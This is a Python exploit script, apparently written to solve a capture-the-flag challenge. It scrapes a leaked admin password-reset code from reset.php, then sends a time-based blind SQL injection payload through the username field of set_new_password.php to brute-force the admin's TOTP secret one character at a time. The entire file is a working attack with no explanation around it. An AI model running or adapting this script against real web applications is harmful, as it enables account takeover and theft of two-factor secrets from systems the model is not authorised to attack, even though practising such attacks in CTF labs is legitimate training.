import time
import requests


class DumperOTP(object):
    def __init__(self):
        self.url = input("url here CTF: ")
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            # "Cookie": "PHPSESSID=atg9k8hfitkkk9me76qcigrqja"
        }
    def get_code(self):
        data: dict = {
            "form_name": "reset",
            "username": "admin",
            "is_tenant": "1"
        }
                
        req = requests.post(url=f"{self.url}/reset.php", data=data, headers=self.headers)
        code = req.text.split('Warning: Reset code ')[1].split()[0]
        print(f"[ *** Password Reset Code: {code} *** ]")

        return code
    def send_attack(self):
        MAX_LEN = 8
        characterset = "ABCDEFGHIJKLMNPQRSTUVWXYZ234567"
        totp_code = ''
        for _ in range(8):
            for char in characterset:
                reset_code = self.get_code()
                
                totp_code += char
                payload = f"admin' AND totp_secret LIKE '{totp_code}%' AND (SELECT count(*)FROM (WITH RECURSIVE delay(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM delay WHERE x < 10000000) SELECT * FROM delay)) > 0-- -"
                print(f"[ Testing Code: '{totp_code}' ]")

                data = {
                    "form_name": "set_new_password",
                    "code": f"{reset_code}",
                    "username": f"{payload}",
                    "password": "admin",
                    "password_confirm": "admin"
                }

                
                start = time.time()
                req = requests.post(url = f"{self.url}/set_new_password.php", headers=self.headers, data=data)
                with open('test.html', 'wb') as f:
                    f.write(req.content)
                end = time.time()
                if end-start > 2:
                    break
                else:
                    totp_code = totp_code[:-1]

                
                print(f"[ Took: {end-start}s to execute the query ! ]")

if __name__ == "__main__":
    DumperObj = DumperOTP()
    DumperObj.send_attack()